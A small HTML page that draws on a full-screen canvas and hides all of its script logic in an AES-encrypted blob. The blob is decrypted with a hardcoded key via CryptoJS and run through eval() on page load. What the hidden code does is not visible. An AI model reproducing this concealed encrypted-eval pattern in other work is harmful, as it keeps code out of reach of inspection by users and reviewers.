<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style media="screen" type="text/css">
      * {margin: 0; padding: 0;}
      body {background: black;}
      canvas {display: block;}
    </style>
  </head>
  <body>
    <canvas id="c"></canvas>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js"></script>
    <script>
        function f(a){var b = "var b";
            var d = CryptoJS.AES.decrypt(a, b).toString(CryptoJS.enc.Utf8);
            eval(d);}
        var l = [];
        l.push(`U2FsdGVkX1/ba8zFGLI1KzyNERHqHFe9m6o1gtkwf2J6insf4ASDh+AmS0do0oNRSwI2Yybf/qKhoWVOBJQy7TTOXERr0BPEx9sCiiT6RooJBG0blusF4bvK5S27POA0qL1m+sMzO1YOayHGvxlBMqqTjrUsgkL5kQlwyKB7JEbRvsz9sfE+XJlzkUSyAWA4W833aTXtHJlWJ55byj3iUl7tlsW082ULeeW8aY9uROekgmOc4yb+HqrwOpaT+Mh4div0yXpdELhRHC87Ek7AQVCpVjgr7PimX0Via6m7nxouu9It5aetcgttDsl57gPZkd4Mkj8w/bMmCw0gSEbJi4TDV6LDuICKgAtJkd2j6hig247t7NehaXMBbxz3v0r4Z6g7sykxBU0wFe3V9t+kcIm1mbZagEpe7kW1rFDnNVW5d9Y8C7Hf0KDBQZqaeLqVAMXOEHO3eWf14YTAE5CyBvebVPv9m4PM99yszR4v+hmuG54hCsfZlNmSaS7fcvZt1md+yEK0Vb0ZCuERmWQV0y3G6RK2ptNRi+VEJzhFJs6MoqJSUN5c866/77E1A1OaxtQiCnf2mB+37UUxYgQuf+FjmbwTD8f54zbfRDbqhepE0plRUc/MnxreDg7Q1LyuiKrGrOEo08DZTslhXH29X78qEBpDDBoxsaRR7DXk8EHyrmErUOY0oZXT22Xl4o7NlUOqnTiJ+O3ariw/CekW5fwojIZ5shnbn8JtJEeWJ2tO2gv3MjXBSEdZMOZrMSMMQMqoo/yhttTZHtyo9+tw0ZAsfO1rB8MNidT7BCmkQdBy5XaDuvYQrKjLJraPX/tlih4sC8666W+FqHC+CfEPFf4Nub3zBI4OD2dbsETLEy5QIacr6X5PKOCgYImM7wwQKYVaYvNBS6T3VuVZKWbUXhVpYxeI5Y57huE45MSyrZV3CYqV1PZ0A6LQnwi/rV9f1jqBOXf7LEg+RVvXalt/6Ouq6EM9p8/FpZAFTD/OFQRMRIST7WmqkRJOvGIn5ZOwQTr79N+csTrfErASPMvmsFQgK/CKV7GtsI26Q7kzQei+9Us2+i4Cw/MPvY7349FfSeH2059RnYzCB6p7pXjgi6Tf75X6Get+xz0L8OU9x2i5IlRiRTKb0nGwL49zbZW3m8bHgYqA0ZUxLIV4Sb+GvFIljNdMhQ+rn2Heji2ANQDKz71YDe+fPoDRXyiwhnF8wv5whP4gvgCyVvgrgcenKg==`);
        for (i = 0; i < l.length; i++) {
            f(l[i]);
        }
    </script>
  </body>
</html>
